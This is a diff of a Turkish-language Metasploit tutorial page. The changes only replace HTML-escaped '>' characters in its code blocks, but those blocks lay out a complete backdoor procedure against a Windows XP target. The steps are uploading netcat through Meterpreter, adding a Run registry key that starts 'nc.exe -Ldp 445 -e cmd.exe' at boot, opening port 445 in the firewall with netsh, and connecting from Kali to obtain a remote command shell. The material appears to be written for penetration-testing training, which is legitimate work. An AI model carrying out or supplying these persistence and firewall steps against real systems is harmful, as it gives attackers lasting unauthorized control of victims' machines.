@@ -30,7 +30,7 @@ Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok 
 
 
 ```bash
-meterpreter **&gt;** reg
+meterpreter **>** reg
 Usage: reg **[**command**]** **[**options]
 
 Interact with the target machine's registry.
@@ -45,13 +45,13 @@ OPTIONS:
 
 COMMANDS:
 
-    enumkey    Enumerate the supplied registry key [-k &gt;key&gt;]
-    createkey  Create the supplied registry key  [-k &gt;key&gt;]
-    deletekey  Delete the supplied registry key  [-k &gt;key&gt;]
-    queryclass Queries the class of the supplied key [-k &gt;key&gt;]
-    setval     Set a registry value [-k &gt;key&gt; -v &gt;val&gt; -d &gt;data&gt;]
-    deleteval  Delete the supplied registry value [-k &gt;key&gt; -v &gt;val&gt;]
-    queryval   Queries the data contents of a value [-k &gt;key&gt; -v &gt;val&gt;]
+    enumkey    Enumerate the supplied registry key [-k >key>]
+    createkey  Create the supplied registry key  [-k >key>]
+    deletekey  Delete the supplied registry key  [-k >key>]
+    queryclass Queries the class of the supplied key [-k >key>]
+    setval     Set a registry value [-k >key> -v >val> -d >data>]
+    deleteval  Delete the supplied registry value [-k >key> -v >val>]
+    queryval   Queries the data contents of a value [-k >key> -v >val>]
 ```
 
 
@@ -80,9 +80,9 @@ Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme `netcat` 
 
 
 ```bash
-meterpreter **&gt;** upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
-**[*********]** uploading  : /tmp/nc.exe -&gt; C:\windows\system32
-**[*********]** uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
+meterpreter **>** upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+**[*********]** uploading  : /tmp/nc.exe -> C:\windows\system32
+**[*********]** uploaded   : /tmp/nc.exe -> C:\windows\system32nc.exe
 ```
 
 
@@ -95,7 +95,7 @@ nc.exe programının işletim sisteminin her başladığında çalışması içi
 
 
 ```bash
-meterpreter **&gt;** reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+meterpreter **>** reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 Enumerating: HKLM\software\microsoft\windows\currentversion\run
 
   Values **(**3**)**:
@@ -111,9 +111,9 @@ Komut çıktısında görüldüğü gibi şu an için `VMware Tools, VMware User
 
 
 ```bash
-meterpreter **&gt;** reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
+meterpreter **>** reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32 c.exe -Ldp 445 -e cmd.exe'
 Successful set nc.
-meterpreter **&gt;** reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+meterpreter **>** reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
 Key: HKLM\software\microsoft\windows\currentversion\Run
 Name: nc
 Type: REG_SZ
@@ -130,12 +130,12 @@ Doğrudan Registry ayarlarından yapabileceğinizi gibi `netsh` komutu ile de fi
 
 
 ```bash
-meterpreter **&gt;** execute -f cmd -i
+meterpreter **>** execute -f cmd -i
 Process 1604 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
-C:\ **&gt;**
+C:\ **>**
 ```
 
 
@@ -144,7 +144,7 @@ Firewall ayarlarının mevcut halini görelim.
 
 
 ```bash
-C:\ **&gt;** netsh firewall show opmode
+C:\ **>** netsh firewall show opmode
 Netsh firewall show opmode
 
 Domain profile configuration:
@@ -168,7 +168,7 @@ Operational mode                  **=** Enable
 
 
 ```bash
-C:\ **&gt;** netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+C:\ **>** netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
 Ok.
 ```
@@ -179,7 +179,7 @@ Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim.
 
 
 ```bash
-C:\ **&gt;** netsh firewall show portopening
+C:\ **>** netsh firewall show portopening
 netsh firewall show portopening
 
 Port configuration **for **Domain profile:
@@ -200,7 +200,7 @@ Port   Protocol  Mode     Name
 138    UDP       Enable   NetBIOS Datagram Service
 
 
-C:\ **&gt;**
+C:\ **>**
 ```
 
 
@@ -215,7 +215,7 @@ root@kali:~# nc -v 172.16.104.128 445
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
 
-C:\ **&gt;** dir
+C:\ **>** dir
 dir
 Volume **in **drive C has no label.
 Volume Serial Number is E423-E726
@@ -241,7 +241,7 @@ Start Menu
 4 File**(**s**)** 0 bytes
 6 Dir**(**s**)** 35,540,791,296 bytes free
 
-C:\ **&gt;**
+C:\ **>**
 ```
 
 
